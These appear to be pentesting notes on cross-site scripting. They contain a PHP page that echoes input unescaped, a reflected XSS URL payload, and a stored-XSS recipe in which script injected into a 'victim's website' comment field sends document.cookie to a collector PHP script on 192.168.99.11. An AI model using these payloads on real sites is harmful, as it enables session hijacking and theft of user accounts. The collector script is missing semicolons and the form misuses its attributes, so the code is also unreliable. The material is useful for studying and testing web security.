# XSS 
**Types**
1. persistent/stored XSS
2. non-persistent/reflected XSS
3. DOM-based XSS

-----------------------------------------------------------

### Form Submission with `$_SERVER['PHP_SELF']`

```html
<html>
<body>
<form method="GET" name="<?php echo $_SERVER['PHP_SELF']; ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        echo $_GET['cmd'];
    }
?>
</pre>
</body>
</html>
```
Because `$_SERVER['PHP_SELF']` is used instead of `htmlspecialchars($_SERVER['PHP_SELF'])`, there is no HTML encoding to the URL we pass. 

As a result, if the regular URL is 
```
http://localhost:3000/TEST.php
```
we should be able to get an alert box by passing 
```
http://localhost:3000/TEST.php/%22%3E%3Cscript%3Ealert('xss')%3C/script%3E%3Cfoo%22
```

where the encoded part translates to `/"><script>alert('xss')</script><foo"`

`PHP_SELF` in this case is `/TEST.php/"><script>alert('xss')</script><foo"` 

-----------------------------------------------------------

### Steal Cookies with Persistent XSS

Suppose on `192.168.99.11` we set up a webserver with the following PHP script: 
```php
<?php
$filename="/tmp/cookie.txt";
$file=fopen($filename, 'a');
$cookie=$_GET['c']    // get the value of 'c' parameter from the URI
fwrite($file,$cookie)
fclose($file)
?>
```

On victim's website, find an injection point vulnerable to stored XSS (i.e. comment field), and inject the following:
```html
<script> 
var i = new Image(); 
i.src="http://192.168.99.11/get.php?c="+document.cookie;
</script> 
```

Then go to `192.168.99.11/tmp/cookie.txt` to see logged cookie. 
